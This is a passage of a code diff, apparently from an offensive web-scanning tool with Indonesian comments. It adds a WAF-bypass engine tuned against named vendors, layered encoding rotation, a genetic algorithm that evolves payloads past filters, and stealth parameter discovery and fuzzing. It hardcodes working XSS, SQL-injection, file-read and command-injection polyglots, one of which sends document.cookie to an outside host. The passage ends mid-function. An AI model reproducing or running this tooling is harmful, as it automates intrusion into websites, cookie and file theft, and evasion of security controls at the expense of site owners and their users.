+                result = re.sub(r'<script>', '<scr<!-- -->ipt>', result, flags=re.I)
+            if "javascript:" in result.lower():
+                result = re.sub(r'javascript:', 'java\\tscript:', result, flags=re.I)
+            return result
+
+        return payload
+
+    def protocol_smuggling_headers(self) -> Dict[str, str]:
+        """Generate headers untuk protocol smuggling."""
+        smuggling_headers = {}
+        technique = random.choice(["xff", "double_host", "chunked", "transfer"])
+
+        if technique == "xff":
+            smuggling_headers["X-Forwarded-For"] = "127.0.0.1"
+            smuggling_headers["X-Real-IP"] = "127.0.0.1"
+        elif technique == "double_host":
+            smuggling_headers["Host"] = "localhost"
+        elif technique == "chunked":
+            smuggling_headers["Transfer-Encoding"] = "chunked"
+        elif technique == "transfer":
+            smuggling_headers["Transfer-Encoding"] = "identity"
+
+        return smuggling_headers
+
+    def apply_waf_bypass(self, payload: str, category: str,
+                        waf_type: str = "") -> Tuple[str, Dict[str, str]]:
+        """Apply kombinasi WAF bypass techniques."""
+        extra_headers = {}
+        modified = payload
+
+        techniques = []
+
+        # 1. Fragment signature (always try)
+        if random.random() < 0.6:
+            modified = self.fragment_signature(modified, category)
+            techniques.append("fragment")
+
+        # 2. Control char insertion (for blocked payloads)
+        if random.random() < 0.3:
+            modified = self.insert_control_chars(modified, 0.05)
+            techniques.append("control_char")
+
+        # 3. Non-standard whitespace
+        if random.random() < 0.4:
+            modified = self.insert_non_standard_whitespace(modified)
+            techniques.append("non_std_ws")
+
+        # 4. Protocol smuggling headers
+        if random.random() < 0.2:
+            extra_headers = self.protocol_smuggling_headers()
+            techniques.append("smuggling")
+
+        # WAF-specific bypasses
+        if waf_type == "cloudflare":
+            # CF often misses encoded newlines
+            modified = modified.replace(" ", random.choice(["%0a%09", "%0d%0a%20"]))
+        elif waf_type == "modsecurity":
+            # ModSec can be bypassed with chunked encoding
+            extra_headers["Transfer-Encoding"] = "chunked"
+        elif waf_type == "incapsula":
+            # Incapsula sometimes misses double-encoded payloads
+            modified = quote(modified, safe="")
+
+        return modified, extra_headers
+
+
+# ============================================================
+# ADAPTIVE ENCODING ROTATION
+# ============================================================
+class AdaptiveEncodingRotation:
+    """
+    Siklus encoding dinamis berlapis yang berubah berdasarkan respons WAF.
+    Jika satu encoding gagal, otomatis beralih ke kombinasi lain.
+    """
+
+    ENCODING_CHAINS = [
+        ["raw"],
+        ["url_encode"],
+        ["double_url_encode"],
+        ["hex_encode"],
+        ["html_entity"],
+        ["unicode_escape"],
+        ["url_encode", "html_entity"],
+        ["hex_encode", "case_alter"],
+        ["double_url_encode", "comment_obfuscate"],
+        ["url_encode", "case_alter", "comment_obfuscate"],
+        ["html_entity", "unicode_escape"],
+        ["triple_url_encode"],
+        ["url_encode", "hex_encode", "case_alter"],
+        ["double_url_encode", "html_entity", "zero_width"],
+        ["unicode_escape", "case_alter", "comment_obfuscate"],
+    ]
+
+    def __init__(self):
+        self.chain_scores: Dict[int, float] = {i: 0.5 for i in range(len(self.ENCODING_CHAINS))}
+        self.chain_failures: Dict[int, int] = {i: 0 for i in range(len(self.ENCODING_CHAINS))}
+        self.current_chain_index = 0
+        self.rotation_threshold = 3  # Switch after N failures
+
+    def get_current_chain(self) -> List[str]:
+        return self.ENCODING_CHAINS[self.current_chain_index]
+
+    def record_result(self, chain_index: int, success: bool):
+        if success:
+            self.chain_scores[chain_index] = min(1.0, self.chain_scores[chain_index] + 0.1)
+            self.chain_failures[chain_index] = 0
+        else:
+            self.chain_scores[chain_index] = max(0.0, self.chain_scores[chain_index] - 0.05)
+            self.chain_failures[chain_index] += 1
+
+            if self.chain_failures[chain_index] >= self.rotation_threshold:
+                self._rotate_to_next()
+
+    def _rotate_to_next(self):
+        """Beralih ke chain dengan skor tertinggi yang belum gagal."""
+        best_idx = self.current_chain_index
+        best_score = -1
+        for idx, score in self.chain_scores.items():
+            if idx != self.current_chain_index and self.chain_failures[idx] < self.rotation_threshold:
+                if score > best_score:
+                    best_score = score
+                    best_idx = idx
+        if best_idx == self.current_chain_index:
+            # All chains failed, reset
+            for idx in self.chain_failures:
+                self.chain_failures[idx] = 0
+            best_idx = random.randint(0, len(self.ENCODING_CHAINS) - 1)
+        self.current_chain_index = best_idx
+
+    def apply_chain(self, payload: str, chain: List[str] = None) -> str:
+        if chain is None:
+            chain = self.get_current_chain()
+        result = payload
+        for encoding in chain:
+            result = self._apply_encoding(result, encoding)
+        return result
+
+    def _apply_encoding(self, text: str, encoding: str) -> str:
+        if encoding == "raw":
+            return text
+        elif encoding == "url_encode":
+            return quote(text, safe="")
+        elif encoding == "double_url_encode":
+            return quote(quote(text, safe=""), safe="")
+        elif encoding == "triple_url_encode":
+            return quote(quote(quote(text, safe=""), safe=""), safe="")
+        elif encoding == "hex_encode":
+            return "".join(f"\\x{ord(c):02x}" if random.random() < 0.5 else c for c in text)
+        elif encoding == "html_entity":
+            return "".join(f"&#{ord(c)};" if random.random() < 0.5 else c for c in text)
+        elif encoding == "unicode_escape":
+            return "".join(f"\\u{ord(c):04x}" if random.random() < 0.5 else c for c in text)
+        elif encoding == "case_alter":
+            return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in text)
+        elif encoding == "comment_obfuscate":
+            comments = ["/**/", "/*!*/", "/**x**/"]
+            result = text
+            for c in [' ', '\t']:
+                if c in result:
+                    result = result.replace(c, random.choice(comments), 1)
+            return result
+        elif encoding == "zero_width":
+            zw = random.choice(["\u200b", "\u200c", "\u200d", "\ufeff"])
+            if len(text) > 3:
+                pos = random.randint(1, len(text) - 1)
+                return text[:pos] + zw + text[pos:]
+            return text
+        return text
+
+    def get_rotation_summary(self) -> str:
+        chain = self.ENCODING_CHAINS[self.current_chain_index]
+        score = self.chain_scores[self.current_chain_index]
+        return f"Chain[{self.current_chain_index}]: {'→'.join(chain)} (score={score:.2f})"
+
+
+# ============================================================
+# POLYGLOT GENERATOR (Context-Aware Multi-Context Payloads)
+# ============================================================
+class PolyglotGenerator:
+    """
+    Menghasilkan payload poliglot yang bisa bekerja di berbagai konteks:
+    - Terbaca sebagai komentar oleh WAF
+    - Terbaca sebagai spasi oleh parser HTML
+    - Dieksekusi sebagai injeksi oleh interpreter backend
+    """
+
+    def generate_sql_xss_polyglot(self) -> List[str]:
+        payloads = [
+            # SQL comment + XSS
+            "';alert(1);//",
+            "';</script><script>alert(1)</script>;//",
+            "'-alert(1)-'",
+            "\"--></script><svg/onload=alert(1)>",
+            "';var x=new Image();x.src='http://x.test/'+document.cookie;//",
+            # SQL error + XSS
+            "'><img src=x onerror=alert(1)>",
+            "'-confirm(1)-'",
+            "1'<script>alert(1)</script>",
+            # Universal polyglot
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)/>\\x3e",
+            # SQL + SSTI + XSS
+            "'{{7*7}}'<script>alert(1)</script>",
+        ]
+        return payloads
+
+    def generate_sqli_lfi_polyglot(self) -> List[str]:
+        payloads = [
+            "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -",
+            "1' AND 1=0 UNION SELECT NULL,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)-- -",
+            "' OR '1'='1' UNION ALL SELECT NULL,NULL,CONVERT(VARCHAR(4000),LOAD_FILE('/etc/passwd'))--",
+        ]
+        return payloads
+
+    def generate_cmdi_sqli_polyglot(self) -> List[str]:
+        payloads = [
+            "';sleep 5;echo $(id);--",
+            "1;cat /etc/passwd;SELECT SLEEP(5)--",
+            "'||`id`||'",
+            "';$(whoami);-- -",
+        ]
+        return payloads
+
+    def generate_universal_polyglots(self) -> List[str]:
+        payloads = [
+            # Works in SQL, HTML, JS, URL contexts
+            "\"><script>alert(1)</script>' OR 1=1--",
+            "'-alert(1)-' OR '1'='1",
+            "1%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
+            # Context breaker
+            "'\"></script><script>alert(1)</script><!--",
+            "1\"><img src=x onerror=alert(1)><!--' OR '1'='1",
+        ]
+        return payloads
+
+    def generate_all_polyglots(self) -> List[Dict]:
+        all_payloads = []
+        polyglot_groups = [
+            ("sql_xss", self.generate_sql_xss_polyglot()),
+            ("sqli_lfi", self.generate_sqli_lfi_polyglot()),
+            ("cmdi_sqli", self.generate_cmdi_sqli_polyglot()),
+            ("universal", self.generate_universal_polyglots()),
+        ]
+        counter = 0
+        for group_name, payloads in polyglot_groups:
+            for payload in payloads:
+                counter += 1
+                all_payloads.append({
+                    "id": f"POLY-{counter:04d}",
+                    "payload": payload,
+                    "category": "polyglot",
+                    "length_tier": "polyglot",
+                    "encoding": "raw",
+                    "strategy": group_name,
+                    "length": len(payload),
+                    "hash": hashlib.md5(payload.encode(errors='ignore')).hexdigest(),
+                    "built_from_scratch": True,
+                    "is_polyglot": True,
+                    "timestamp": datetime.now().isoformat(),
+                })
+        return all_payloads
+
+
+# ============================================================
+# GENETIC ALGORITHM ENGINE
+# ============================================================
+class GeneticEvolver:
+    """
+    Algoritma genetika untuk evolusi payload:
+    - Population management (generasi)
+    - Fitness scoring
+    - Tournament selection
+    - Crossover berbasis AST
+    - Negative selection (blacklist mutasi gagal)
+    - Elitism (keep best)
+    """
+
+    def __init__(self, schema: EvolutionSchema, grammar: GrammarValidator,
+                 encoder: AdaptiveEncodingRotation, waf_bypass: WAFBypassEngine):
+        self.schema = schema
+        self.grammar = grammar
+        self.encoder = encoder
+        self.waf_bypass = waf_bypass
+        self.population: List[Dict] = []
+        self.generation = 0
+        self.elitism_rate = 0.15       # Keep top 15%
+        self.crossover_rate = 0.6      # 60% crossover
+        self.mutation_rate = 0.25      # 25% mutation
+        self.tournament_size = 5
+        self.max_population = 200
+
+    def initialize_population(self, payloads: List[Dict]):
+        self.population = payloads[:self.max_population]
+        self.generation = 1
+
+    def tournament_select(self) -> Dict:
+        """Tournament selection: pick best from random subset."""
+        candidates = random.sample(self.population,
+                                  min(self.tournament_size, len(self.population)))
+        # Sort by fitness (if available)
+        candidates.sort(
+            key=lambda p: p.get("fitness", 0.5),
+            reverse=True
+        )
+        return candidates[0]
+
+    def crossover(self, parent1: Dict, parent2: Dict) -> List[Dict]:
+        """AST-based crossover: swap structural parts between parents."""
+        p1 = parent1.get("payload", "")
+        p2 = parent2.get("payload", "")
+        cat1 = parent1.get("category", "xss")
+        cat2 = parent2.get("category", "xss")
+
+        children = []
+
+        # Same category crossover (structural)
+        if cat1 == cat2:
+            children.extend(self._structural_crossover(p1, p2, cat1))
+        else:
+            # Cross-category: combine strategies
+            children.extend(self._cross_category_crossover(parent1, parent2))
+
+        # Validate children
+        valid_children = []
+        for child in children:
+            is_valid, reason = self.grammar.validate(child["payload"], child["category"])
+            if is_valid:
+                valid_children.append(child)
+
+        return valid_children
+
+    def _structural_crossover(self, p1: str, p2: str, category: str) -> List[Dict]:
+        """Crossover dalam satu category, swap structural parts."""
+        children = []
+
+        if category == "sqli":
+            # Split at comment boundary
+            p1_parts = re.split(r'(/\*.*?\*/|--|#)', p1)
+            p2_parts = re.split(r'(/\*.*?\*/|--|#)', p2)
+
+            if len(p1_parts) >= 2 and len(p2_parts) >= 2:
+                # Swap middle sections
+                mid1 = len(p1_parts) // 2
+                mid2 = len(p2_parts) // 2
+
+                child1 = "".join(p1_parts[:mid1] + p2_parts[mid2:])
+                child2 = "".join(p2_parts[:mid2] + p1_parts[mid1:])
+
+                for child_payload in [child1, child2]:
+                    if child_payload and len(child_payload) > 5:
+                        children.append({
+                            "id": f"GEN-{self.generation}-{len(children):04d}",
+                            "payload": child_payload,
+                            "category": category,
+                            "length_tier": "evolved",
+                            "encoding": "crossover",
+                            "strategy": "ast_crossover",
+                            "length": len(child_payload),
+                            "hash": hashlib.md5(child_payload.encode(errors='ignore')).hexdigest(),
+                            "built_from_scratch": False,
+                            "parent_ids": [],
+                            "generation": self.generation,
+                            "timestamp": datetime.now().isoformat(),
+                        })
+
+        elif category == "xss":
+            # Split at tag boundaries
+            p1_tags = re.findall(r'<[^>]+>', p1)
+            p2_tags = re.findall(r'<[^>]+>', p2)
+
+            if p1_tags and p2_tags:
+                # Combine tags from both parents
+                combined = p1_tags[0] + p2_tags[-1] if len(p2_tags) > 1 else p2_tags[0]
+                children.append({
+                    "id": f"GEN-{self.generation}-XSS-{len(children):04d}",
+                    "payload": combined,
+                    "category": "xss",
+                    "length_tier": "evolved",
+                    "encoding": "crossover",
+                    "strategy": "tag_crossover",
+                    "length": len(combined),
+                    "hash": hashlib.md5(combined.encode(errors='ignore')).hexdigest(),
+                    "built_from_scratch": False,
+                    "generation": self.generation,
+                    "timestamp": datetime.now().isoformat(),
+                })
+
+        # Fallback: simple split-and-join
+        if not children and len(p1) > 5 and len(p2) > 5:
+            mid1 = len(p1) // 2
+            mid2 = len(p2) // 2
+            child = p1[:mid1] + p2[mid2:]
+            children.append({
+                "id": f"GEN-{self.generation}-FALL-{len(children):04d}",
+                "payload": child,
+                "category": category,
+                "length_tier": "evolved",
+                "encoding": "crossover",
+                "strategy": "simple_crossover",
+                "length": len(child),
+                "hash": hashlib.md5(child.encode(errors='ignore')).hexdigest(),
+                "built_from_scratch": False,
+                "generation": self.generation,
+                "timestamp": datetime.now().isoformat(),
+            })
+
+        return children
+
+    def _cross_category_crossover(self, p1: Dict, p2: Dict) -> List[Dict]:
+        """Combine payloads from different categories."""
+        children = []
+
+        # XSS + SQLi polyglot
+        if {p1.get("category"), p2.get("category")} == {"xss", "sqli"}:
+            sqli = p1 if p1.get("category") == "sqli" else p2
+            xss = p1 if p1.get("category") == "xss" else p2
+            polyglot = f"{sqli['payload'][:30]}{xss['payload'][:30]}"
+            children.append({
+                "id": f"GEN-{self.generation}-POLY-{len(children):04d}",
+                "payload": polyglot,
+                "category": "polyglot",
+                "length_tier": "evolved",
+                "encoding": "crossover",
+                "strategy": "cross_category",
+                "length": len(polyglot),
+                "hash": hashlib.md5(polyglot.encode(errors='ignore')).hexdigest(),
+                "built_from_scratch": False,
+                "generation": self.generation,
+                "timestamp": datetime.now().isoformat(),
+            })
+
+        return children
+
+    def mutate(self, payload_dict: Dict) -> Dict:
+        """Apply mutations dengan negative selection."""
+        payload = payload_dict.get("payload", "")
+        category = payload_dict.get("category", "xss")
+        blocked = self.schema.get_blocked_mutations()
+
+        # Available mutations (excluding blocked ones)
+        all_mutations = {
+            "case_variation": lambda s: "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s),
+            "comment_insertion": lambda s: s.replace(" ", random.choice(["/**/", "/*!*/", "/*x*/"]), 1) if " " in s else s,
+            "whitespace_padding": lambda s: f"{random.choice([' ', chr(9), '%09'])}{s}{random.choice([' ', '/**/'])}",
+            "char_encoding": lambda s: "".join(f"%{ord(c):02x}" if random.random() < 0.2 and c in "'\"<>();" else c for c in s),
+            "null_byte_append": lambda s: s + random.choice(["%00", "\\0"]),
+            "double_encoding": lambda s: quote(quote(s, safe=""), safe=""),
+            "keyword_split": lambda s: self._split_keywords(s),
+            "alternative_syntax": lambda s: self._alt_syntax(s, category),
+            "newline_injection": lambda s: s[:len(s)//2] + "%0a" + s[len(s)//2:] if len(s) > 5 else s,
+            "tab_separation": lambda s: s.replace(" ", "%09") if " " in s else s,
+            "url_encode": lambda s: quote(s, safe=""),
+            "hex_encode": lambda s: "".join(f"\\x{ord(c):02x}" if random.random() < 0.3 else c for c in s),
+            "hpp_split": lambda s: self._hpp_mutate(s),
+            "control_char_insert": lambda s: self.waf_bypass.insert_control_chars(s, 0.05),
+            "waf_fragment": lambda s: self.waf_bypass.fragment_signature(s, category),
+        }
+
+        available = {k: v for k, v in all_mutations.items() if k not in blocked}
+        if not available:
+            # Reset blocked if all are blocked
+            available = all_mutations
+
+        # Apply 1-3 random mutations
+        num_muts = random.randint(1, 3)
+        mutations_applied = []
+        result = payload
+        for _ in range(num_muts):
+            mut_name = random.choice(list(available.keys()))
+            try:
+                result = available[mut_name](result)
+                mutations_applied.append(mut_name)
+            except:
+                continue
+
+        # Apply adaptive encoding rotation
+        result = self.encoder.apply_chain(result)
+
+        # Validate
+        is_valid, reason = self.grammar.validate(result, category)
+        if not is_valid:
+            result = payload  # Revert if invalid
+
+        mutated = payload_dict.copy()
+        mutated["payload"] = result
+        mutated["id"] = f"GEN-{self.generation}-MUT-{random.randint(1000,9999)}"
+        mutated["encoding"] = "mutated"
+        mutated["strategy"] = "+".join(mutations_applied) if mutations_applied else "none"
+        mutated["length"] = len(result)
+        mutated["hash"] = hashlib.md5(result.encode(errors='ignore')).hexdigest()
+        mutated["mutation_history"] = mutations_applied
+        mutated["generation"] = self.generation
+        mutated["timestamp"] = datetime.now().isoformat()
+        return mutated
+
+    def _split_keywords(self, s: str) -> str:
+        keywords = ["SELECT", "UNION", "script", "alert", "onerror", "onload",
+                    "FROM", "WHERE", "AND", "OR", "SLEEP", "BENCHMARK"]
+        for kw in keywords:
+            if kw.lower() in s.lower():
+                split_at = random.randint(1, len(kw) - 1)
+                sep = random.choice(["/**/", "/*!*/", "%0a", "%09"])
+                replacement = f"{kw[:split_at]}{sep}{kw[split_at:]}"
+                s = re.sub(re.escape(kw), replacement, s, count=1, flags=re.I)
+        return s
+
+    def _alt_syntax(self, s: str, category: str) -> str:
+        replacements_sql = {
+            "OR": ["||", "OR/**/"],
+            "AND": ["&&", "AND/**/"],
+            "SELECT": ["SELECT ALL", "SELECT DISTINCT"],
+            "SLEEP": ["BENCHMARK(5000000,MD5(0x1))"],
+            "MID": ["SUBSTR", "SUBSTRING"],
+            "CONCAT": ["CONCAT_WS('',''],"],
+        }
+        replacements_xss = {
+            "alert(": ["alert`", "window['alert'](", "self['alert'](",
+                       "top['alert'](", "confirm(", "prompt(1,"],
+            "onerror": ["onload", "onfocus", "onmouseover", "ontoggle"],
+            "script": ["svg", "img", "details", "iframe", "body"],
+        }
+        reps = replacements_sql if category == "sqli" else replacements_xss if category == "xss" else {}
+        for old, alts in reps.items():
+            if old.lower() in s.lower():
+                s = re.sub(re.escape(old), random.choice(alts), s, count=1, flags=re.I)
+        return s
+
+    def _hpp_mutate(self, s: str) -> str:
+        if len(s) < 10:
+            return s
+        mid = len(s) // 2
+        return s[:mid] + "&" + s[mid:]
+
+    def evolve_generation(self) -> List[Dict]:
+        """Run one full generation of evolution."""
+        self.generation += 1
+        new_population = []
+
+        # 1. Elitism: keep top performers
+        sorted_pop = sorted(self.population,
+                           key=lambda p: p.get("fitness", 0.5),
+                           reverse=True)
+        elite_count = max(1, int(len(sorted_pop) * self.elitism_rate))
+        new_population.extend(sorted_pop[:elite_count])
+
+        # 2. Crossover
+        crossover_count = int(len(self.population) * self.crossover_rate)
+        for _ in range(crossover_count // 2):
+            if len(self.population) < 2:
+                break
+            p1 = self.tournament_select()
+            p2 = self.tournament_select()
+            children = self.crossover(p1, p2)
+            new_population.extend(children[:2])
+
+        # 3. Mutation
+        mutation_count = int(len(self.population) * self.mutation_rate)
+        for _ in range(mutation_count):
+            if not self.population:
+                break
+            parent = self.tournament_select()
+            child = self.mutate(parent)
+            new_population.append(child)
+
+        # 4. Fill remaining with random fresh payloads
+        while len(new_population) < len(self.population):
+            if self.population:
+                parent = random.choice(self.population)
+                child = self.mutate(parent)
+                new_population.append(child)
+            else:
+                break
+
+        # Deduplicate by hash
+        seen = set()
+        unique = []
+        for p in new_population:
+            h = p.get("hash", "")
+            if h and h not in seen:
+                seen.add(h)
+                unique.append(p)
+
+        self.population = unique[:self.max_population]
+        return self.population
+
+    def update_fitness(self, payload_id: str, fitness: float):
+        for p in self.population:
+            if p.get("id") == payload_id:
+                p["fitness"] = fitness
+                break
+
+    def get_generation_summary(self) -> str:
+        pop_size = len(self.population)
+        avg_fitness = sum(p.get("fitness", 0) for p in self.population) / max(1, pop_size)
+        max_fitness = max((p.get("fitness", 0) for p in self.population), default=0)
+        categories = Counter(p.get("category", "?") for p in self.population)
+        return (f"Gen {self.generation}: pop={pop_size}, "
+                f"avg_fit={avg_fitness:.3f}, max_fit={max_fitness:.3f}, "
+                f"cats={dict(categories)}")
+
+
+# ============================================================
+# PARAMETER DISCOVERY (DEEP v5.0 — all v4.0 features preserved)
 # ============================================================
 @dataclass
 class Parameter:
-    """Parameter yang ditemukan."""
     name: str
-    location: str  # url_query, form_input, hidden, ajax, path, header, fuzzed, endpoint, robots_txt, sitemap
+    location: str
     method: str = "GET"
     url: str = ""
     original_value: str = ""
@@ -350,24 +1571,13 @@ class Parameter:
     form_action: str = ""
     form_id: str = ""
     context: Dict[str, Any] = field(default_factory=dict)
+    injection_context: str = "unknown"
 
     def to_dict(self):
         return asdict(self)
 
 
 class ParameterDiscovery:
-    """
-    DEEP parameter discovery v4.0.
-    - Scan halaman utama + internal pages (2 levels deep)
-    - robots.txt + sitemap.xml scanning
-    - Parameter bruteforce/fuzzing (50+ common params)
-    - Path-based parameter detection
-    - JS-rendered page scanning
-    - Common vulnerable endpoint scanning
-    - External JS file scanning
-    """
-
-    # 50+ common parameters to fuzz
     COMMON_PARAMS = [
         "id", "page", "p", "pid", "cid", "uid", "cat", "category",
         "post", "article", "news", "item", "product", "order",
@@ -392,7 +1602,6 @@ class ParameterDiscovery:
         "preview", "draft", "print", "export", "download",
     ]
 
-    # Common paths that often have parameters
     COMMON_PATHS = [
         "/index.php", "/index.html", "/index.asp", "/index.aspx",
         "/article.php", "/post.php", "/news.php", "/berita.php", "/artikel.php",
@@ -420,61 +1629,43 @@ class ParameterDiscovery:
         self.visited_urls = set()
         self.discovered_urls = set()
         self.client = get_stealth_client()
-        self.browser = None
+        self.context_detector = ContextDetector()
 
     def run(self) -> List[Parameter]:
-        """Jalankan semua discovery phases."""
         print(f"\n\033[36m[*]\033[0m Starting DEEP parameter discovery on: \033[1;37m{self.target}\033[0m")
 
-        # Phase 1: URL query parameters
         print(f"    \033[36m[1/10]\033[0m Scanning URL query parameters...")
         self._extract_url_params()
 
-        # Phase 2: Fetch halaman utama
         print(f"    \033[36m[2/10]\033[0m Fetching main page...")
         html = self._fetch_page(self.target)
         if not html:
-            alt_target = self.target.replace("http://", "https://")
-            html = self._fetch_page(alt_target)
+            alt = self.target.replace("http://", "https://")
+            html = self._fetch_page(alt)
             if html:
-                self.target = alt_target
-                self.parsed = urlparse(alt_target)
+                self.target = alt
+                self.parsed = urlparse(alt)
                 self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
 
         if not html:
-            print(f"    \033[31m[!]\033[0m Tidak bisa fetch target, melanjutkan dengan fuzzing...")
+            print(f"    \033[31m[!]\033[0m Cannot fetch target, continuing with fuzzing...")
         else:
             print(f"    \033[32m[✓]\033[0m Main page fetched ({len(html)} bytes)")
-
-            # Phase 3: Form inputs
             print(f"    \033[36m[3/10]\033[0m Scanning HTML forms...")
             self._extract_form_params(html)
-
-            # Phase 4: Hidden inputs & meta
             print(f"    \033[36m[4/10]\033[0m Scanning hidden parameters...")
             self._extract_hidden_params(html)
-
-            # Phase 5: JavaScript endpoints (inline + external)
             print(f"    \033[36m[5/10]\033[0m Scanning JavaScript endpoints...")
             self._extract_js_endpoints(html)
-
-            # Phase 6: DEEP link crawling (2 levels)
             print(f"    \033[36m[6/10]\033[0m Deep crawling internal links (2 levels)...")
             self._deep_crawl_links(html)
 
-        # Phase 7: robots.txt + sitemap.xml
         print(f"    \033[36m[7/10]\033[0m Scanning robots.txt & sitemap.xml...")
         self._scan_robots_sitemap()
-
-        # Phase 8: PARAMETER FUZZING (the KEY feature!)
-        print(f"    \033[36m[8/10]\033[0m Parameter bruteforce/fuzzing (testing {len(self.COMMON_PARAMS)} params)...")
+        print(f"    \033[36m[8/10]\033[0m Parameter bruteforce/fuzzing...")
         self._fuzz_parameters()
-
-        # Phase 9: Common vulnerable endpoints
         print(f"    \033[36m[9/10]\033[0m Scanning common endpoints...")
         self._scan_common_endpoints()
-
-        # Phase 10: Path-based parameters
         print(f"    \033[36m[10/10]\033[0m Detecting path-based parameters...")
         self._detect_path_params()
 
@@ -488,15 +1679,13 @@ class ParameterDiscovery:
                 unique.append(p)
         self.parameters = unique
 
-        print(f"\n    \033[32m[✓]\033[0m DEEP Discovery complete: \033[1;37m{len(self.parameters)}\033[0m unique parameters found")
+        print(f"\n    \033[32m[✓]\033[0m DEEP Discovery: \033[1;37m{len(self.parameters)}\033[0m unique parameters")
         return self.parameters
 
     def _fetch_page(self, url: str) -> Optional[str]:
-        """Fetch halaman dengan stealth client."""
         if url in self.visited_urls:
             return None
         self.visited_urls.add(url)
-
         try:
             if self.client:
                 resp = self.client.get(url)
@@ -504,538 +1693,295 @@ class ParameterDiscovery:
                     return resp.text
         except Exception:
             pass
-
         try:
             if HAS_REQUESTS:
-                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
-                resp = requests.get(url, headers=headers, timeout=20, verify=False)
+                resp = requests.get(url, headers={"User-Agent": random.choice(STEALTH_HEADERS)},
+                                   timeout=20, verify=False)
                 if resp.status_code < 400:
                     return resp.text
         except Exception:
             pass
         return None
 
-    def _fetch_page_allow_visited(self, url: str) -> Optional[str]:
-        """Fetch halaman tanpa cek visited (untuk fuzzing)."""
+    def _fetch_page_raw(self, url: str):
         try:
             if self.client:
                 resp = self.client.get(url)
                 return resp.text, resp.status_code, len(resp.content)
-        except Exception:
+        except:
             pass
         try:
             if HAS_REQUESTS:
-                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
-                resp = requests.get(url, headers=headers, timeout=15, verify=False)
+                resp = requests.get(url, headers={"User-Agent": random.choice(STEALTH_HEADERS)},
+                                   timeout=15, verify=False)
                 return resp.text, resp.status_code, len(resp.content)
-        except Exception:
+        except:
             pass
         return None, 0, 0
 
     def _extract_url_params(self):
-        """Ekstrak parameter dari URL query string."""
         if self.parsed.query:
             params = parse_qs(self.parsed.query)
             for name, values in params.items():
                 self.parameters.append(Parameter(
-                    name=name,
-                    location="url_query",
-                    method="GET",
+                    name=name, location="url_query", method="GET",
                     url=self.target.split("?")[0],
                     original_value=values[0] if values else "",
                 ))
 
     def _extract_form_params(self, html: str):
-        """Ekstrak parameter dari form HTML."""
-        if not HAS_BS4:
-            return
-
+        if not HAS_BS4: return
         soup = BeautifulSoup(html, "html.parser")
         for form in soup.find_all("form"):
             action = form.get("action", "")
             form_url = urljoin(self.target, action) if action else self.target
             method = form.get("method", "GET").upper()
             form_id = form.get("id", "") or form.get("name", "")
-
             for inp in form.find_all(["input", "textarea", "select"]):
                 name = inp.get("name", "")
-                if not name:
-                    continue
-
+                if not name: continue
                 inp_type = inp.get("type", "text")
-
-                if inp_type in ["submit", "button", "image", "reset"]:
-                    continue
-
+                if inp_type in ["submit", "button", "image", "reset"]: continue
                 loc = "hidden" if inp_type == "hidden" else "form_input"
-
                 self.parameters.append(Parameter(
-                    name=name,
-                    location=loc,
-                    method=method,
-                    url=form_url,
-                    original_value=inp.get("value", ""),
-                    input_type=inp_type,
-                    form_action=action,
-                    form_id=form_id,
+                    name=name, location=loc, method=method, url=form_url,
+                    original_value=inp.get("value", ""), input_type=inp_type,
+                    form_action=action, form_id=form_id,
                     context={"form_id": form_id, "input_type": inp_type},
                 ))
 
     def _extract_hidden_params(self, html: str):
-        """Cari parameter tersembunyi di meta/komentar/data attributes."""
-        # Meta refresh
-        meta_match = re.findall(r'<meta[^>]+content="[^"]*[?&]([^=&"]+)=', html, re.I)
-        for name in meta_match:
-            self.parameters.append(Parameter(
-                name=name, location="hidden", method="GET", url=self.target
-            ))
-
-        # HTML comments dengan parameter
+        meta = re.findall(r'<meta[^>]+content="[^"]*[?&]([^=&"]+)=', html, re.I)
+        for name in meta:
+            self.parameters.append(Parameter(name=name, location="hidden", method="GET", url=self.target))
         comments = re.findall(r'<!--(.*?)-->', html, re.S)
-        param_pattern = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=')
-        for comment in comments:
-            for match in param_pattern.findall(comment):
-                self.parameters.append(Parameter(
-                    name=match, location="hidden", method="GET",
-                    url=self.target, context={"source": "comment"}
-                ))
-
-        # Data attributes
-        data_attrs = re.findall(r'data-(?:url|href|action|api|endpoint)=["\']([^"\']+\?[^"\']+)["\']', html, re.I)
-        for attr_url in data_attrs:
-            full_url = urljoin(self.target, attr_url)
-            parsed = urlparse(full_url)
+        pp = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=')
+        for c in comments:
+            for m in pp.findall(c):
+                self.parameters.append(Parameter(name=m, location="hidden", method="GET",
+                    url=self.target, context={"source": "comment"}))
+        data = re.findall(r'data-(?:url|href|action|api|endpoint)=["\']([^"\']+\?[^"\']+)["\']', html, re.I)
+        for u in data:
+            full = urljoin(self.target, u)
+            parsed = urlparse(full)
             if parsed.query:
-                params = parse_qs(parsed.query)
-                for name in params:
-                    self.parameters.append(Parameter(
-                        name=name, location="hidden", method="GET",
-                        url=full_url.split("?")[0],
-                        context={"source": "data_attribute"}
-                    ))
+                for name in parse_qs(parsed.query):
+                    self.parameters.append(Parameter(name=name, location="hidden", method="GET",
+                        url=full.split("?")[0], context={"source": "data_attribute"}))
 
     def _extract_js_endpoints(self, html: str):
-        """Ekstrak endpoint dari inline + external JavaScript."""
         scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)
-
-        # Also fetch external JS files
-        ext_scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
-        for ext_url in ext_scripts[:8]:
-            full_url = urljoin(self.target, ext_url)
-            js_content = self._fetch_page(full_url)
-            if js_content:
-                scripts.append(js_content)
-
-        url_patterns = [
+        ext = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
+        for u in ext[:8]:
+            c = self._fetch_page(urljoin(self.target, u))
+            if c: scripts.append(c)
+        patterns = [
